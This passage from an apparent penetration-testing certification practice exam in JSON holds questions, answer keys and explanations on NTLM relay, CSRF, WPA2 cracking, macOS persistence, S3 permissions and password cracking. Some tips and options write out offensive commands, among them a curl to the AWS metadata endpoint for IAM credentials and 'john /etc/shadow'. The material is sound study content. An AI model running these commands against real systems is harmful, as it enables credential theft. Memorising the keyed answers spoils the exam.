      "explanation": "AWS metadata services often expose IAM role credentials, allowing attackers to escalate privileges. Cracking passwords is time-consuming and not specific to AWS. Kernel exploits may work but require a known vulnerability. `/etc/passwd` enumeration is useful but does not guarantee privilege escalation.",
      "examTip": "AWS metadata services can leak IAM role credentials—use `curl http://169.254.169.254/latest/meta-data/` to check."
    },
    {
      "id": 95,
      "question": "Which of the following is the PRIMARY reason that NTLM authentication is vulnerable to relay attacks?",
      "options": [
        "NTLM does not require mutual authentication between client and server",
        "NTLM hashes are stored in an easily reversible format",
        "NTLM authentication is susceptible to dictionary attacks",
        "NTLM allows plaintext password transmission over SMB"
      ],
      "correctAnswerIndex": 0,
      "explanation": "NTLM lacks mutual authentication, enabling attackers to relay authentication requests to another system. NTLM hashes are not easily reversible, but they can be used in Pass-the-Hash attacks. Dictionary attacks are possible but unrelated to relaying. NTLM does not transmit plaintext passwords.",
      "examTip": "Enabling SMB signing can mitigate NTLM relay attacks by ensuring authentication integrity."
    },
    {
      "id": 96,
      "question": "A penetration tester is analyzing network traffic and finds the following HTTP request:\n\n```\nGET /admin HTTP/1.1\nHost: target.com\nReferer: http://evil.com\n```\n\nWhat attack technique does this request indicate?",
      "options": [
        "Cross-Site Request Forgery (CSRF)",
        "SQL injection",
        "Cross-Site Scripting (XSS)",
        "Command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A `Referer` header pointing to an external site (`evil.com`) suggests a CSRF attack, where the attacker tricks a user into making unauthorized requests. SQL injection targets database queries. XSS involves JavaScript execution. Command injection manipulates system commands.",
      "examTip": "CSRF attacks exploit authenticated sessions by making unauthorized requests on behalf of users."
    },
    {
      "id": 97,
      "question": "A penetration tester is able to capture WPA2 handshake packets from a target Wi-Fi network. What is the MOST effective next step?",
      "options": [
        "Use a precomputed PMK dictionary attack",
        "Attempt an Evil Twin attack",
        "Perform a deauthentication attack",
        "Launch a brute-force attack against the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Precomputed PMK dictionaries allow offline WPA2 handshake cracking. An Evil Twin attack tricks users into connecting to a rogue AP but does not directly break WPA2. Deauthentication forces clients to reconnect but does not recover credentials. Brute-forcing WPA2 is inefficient without precomputed PMKs.",
      "examTip": "Capturing a WPA2 handshake allows offline cracking with tools like `aircrack-ng` or `hashcat`."
    },
    {
      "id": 98,
      "question": "Which of the following persistence techniques is commonly used by attackers on macOS systems?",
      "options": [
        "Creating a LaunchAgent to execute a malicious payload",
        "Modifying the Windows registry Run keys",
        "Injecting a payload into the LSASS process",
        "Exploiting an NTLM relay vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LaunchAgents allow macOS malware to persist across reboots. Windows registry modifications are specific to Windows. LSASS process injection is a Windows-specific attack. NTLM relay is a network authentication attack, not a persistence mechanism.",
      "examTip": "macOS persistence often involves LaunchAgents, LaunchDaemons, or modifying system startup files."
    },
    {
      "id": 99,
      "question": "A penetration tester is analyzing an AWS S3 bucket and finds the following permission settings:\n\n```\n\"Effect\": \"Allow\",\n\"Principal\": \"*\",\n\"Action\": \"s3:GetObject\",\n\"Resource\": \"arn:aws:s3:::company-data/*\"\n```\n\nWhat is the MOST significant risk associated with this configuration?",
      "options": [
        "Anyone can read the files stored in the bucket",
        "Attackers can modify or delete objects in the bucket",
        "The bucket can be used for privilege escalation",
        "IAM users can execute arbitrary commands on AWS EC2 instances"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Allowing `Principal: *` with `s3:GetObject` means anyone can read files in the bucket. Attackers cannot modify or delete files unless `s3:PutObject` is also allowed. Privilege escalation would require IAM misconfigurations. EC2 execution requires `ec2:RunInstances` permissions.",
      "examTip": "Check AWS S3 permissions carefully—public read access (`Principal: *`) often leads to data leaks."
    },
    {
      "id": 100,
      "question": "Which of the following commands would be MOST effective for identifying user accounts with weak passwords on a Linux system?",
      "options": [
        "`john /etc/shadow`",
        "`nmap --script ssh-brute`",
        "`find / -type f -perm -4000`",
        "`cat /etc/passwd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`john /etc/shadow` cracks Linux password hashes to identify weak passwords. `nmap --script ssh-brute` performs brute-force attacks over SSH. `find / -type f -perm -4000` lists SUID binaries, not passwords. `/etc/passwd` contains usernames but not password hashes.",
      "examTip": "Use `john` or `hashcat` to crack password hashes and identify weak credentials."
    }
  ]
});
